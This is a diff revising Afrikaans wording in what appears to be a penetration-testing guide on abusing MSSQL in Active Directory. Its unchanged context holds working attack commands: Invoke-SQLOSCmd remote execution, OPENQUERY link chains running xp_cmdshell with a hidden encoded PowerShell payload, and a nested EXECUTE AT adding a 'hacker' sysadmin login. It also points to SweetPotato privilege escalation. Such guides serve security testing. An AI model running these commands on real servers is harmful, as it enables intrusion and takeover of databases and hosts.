@@ -161,7 +161,7 @@ Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" }
 ```
 ### MSSQL RCE
 
-Dit mag ook moontlik wees om **opdragte** binne die MSSQL gasheer uit te voer.
+Dit mag ook moontlik wees om **opdragte** binne die MSSQL-gasheer uit te voer.
 ```bash
 Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
 # Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
@@ -176,7 +176,7 @@ Kontroleer in die bladsy genoem in die **volgende afdeling hoe om dit handmatig 
 
 ## MSSQL Betroubare Skakels
 
-As 'n MSSQL-instansie betroubaar (databasis skakel) is deur 'n ander MSSQL-instansie. As die gebruiker bevoegdhede oor die betroubare databasis het, gaan hy in staat wees om die **vertrouensverhouding te gebruik om navrae ook in die ander instansie uit te voer**. Hierdie vertroue kan geketting word en op 'n sekere punt mag die gebruiker in staat wees om 'n verkeerd geconfigureerde databasis te vind waar hy opdragte kan uitvoer.
+As 'n MSSQL-instansie betroubaar (databasis skakel) is deur 'n ander MSSQL-instansie. As die gebruiker voorregte oor die betroubare databasis het, sal hy in staat wees om **die vertrouensverhouding te gebruik om navrae ook in die ander instansie uit te voer**. Hierdie vertroue kan geketting word en op 'n sekere punt mag die gebruiker in staat wees om 'n verkeerd geconfigureerde databasis te vind waar hy opdragte kan uitvoer.
 
 **Die skakels tussen databasisse werk selfs oor woudvertroue.**
 
@@ -230,7 +230,7 @@ Let wel dat metasploit slegs die `openquery()` funksie in MSSQL sal probeer misb
 
 ### Handmatig - Openquery()
 
-Van **Linux** kan jy 'n MSSQL konsole skulp met **sqsh** en **mssqlclient.py** verkry.
+Van **Linux** kan jy 'n MSSQL konsole-skal met **sqsh** en **mssqlclient.py** verkry.
 
 Van **Windows** kan jy ook die skakels vind en opdragte handmatig uitvoer met 'n **MSSQL kliënt soos** [**HeidiSQL**](https://www.heidisql.com)
 
@@ -252,11 +252,11 @@ Voer navrae uit deur die skakel (voorbeeld: vind meer skakels in die nuwe toegan
 select * from openquery("dcorp-sql1", 'select * from master..sysservers')
 ```
 > [!WARNING]
-> Kontroleer waar dubbele en enkele aanhalingsmerke gebruik word, dit is belangrik om dit op daardie manier te gebruik.
+> Kyk waar dubbel en enkel aanhalingsmerke gebruik word, dit is belangrik om dit op daardie manier te gebruik.
 
 ![](<../../images/image (643).png>)
 
-Jy kan hierdie vertroude skakelsketting handmatig vir ewig voortset.
+Jy kan hierdie betroubare skakelketting handmatig vir ewig voortset.
 ```sql
 # First level RCE
 SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')
@@ -278,12 +278,12 @@ EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT 
 
 Die **MSSQL plaaslike gebruiker** het gewoonlik 'n spesiale tipe voorreg genaamd **`SeImpersonatePrivilege`**. Dit stel die rekening in staat om "n kliënt na verifikasie te verteenwoordig".
 
-'n Strategie wat baie outeurs ontwikkel het, is om 'n SYSTEM-diens te dwing om te verifieer by 'n rogue of man-in-the-middle diens wat die aanvaller skep. Hierdie rogue diens kan dan die SYSTEM-diens verteenwoordig terwyl dit probeer om te verifieer.
+'n Strategie wat baie outeurs ontwikkel het, is om 'n SYSTEM-diens te dwing om te verifieer met 'n rogue of man-in-the-middle diens wat die aanvaller skep. Hierdie rogue diens kan dan die SYSTEM-diens verteenwoordig terwyl dit probeer om te verifieer.
 
 [SweetPotato](https://github.com/CCob/SweetPotato) het 'n versameling van hierdie verskillende tegnieke wat uitgevoer kan word via Beacon se `execute-assembly` opdrag.
 
 ### SCCM Bestuurspunt NTLM Relay (OSD Geheimekstraksie)
-Sien hoe die standaard SQL rolle van SCCM **Bestuurspunte** misbruik kan word om Netwerk Toegang Rekening en Taakvolg Geheimenisse direk uit die webdatabasis te dump:
+Sien hoe die standaard SQL rolle van SCCM **Bestuurspunte** misbruik kan word om Netwerk Toegang Rekening en Taak-Reeks geheime direk uit die webdatabasis te dump:
 {{#ref}}
 sccm-management-point-relay-sql-policy-secrets.md
 {{#endref}}
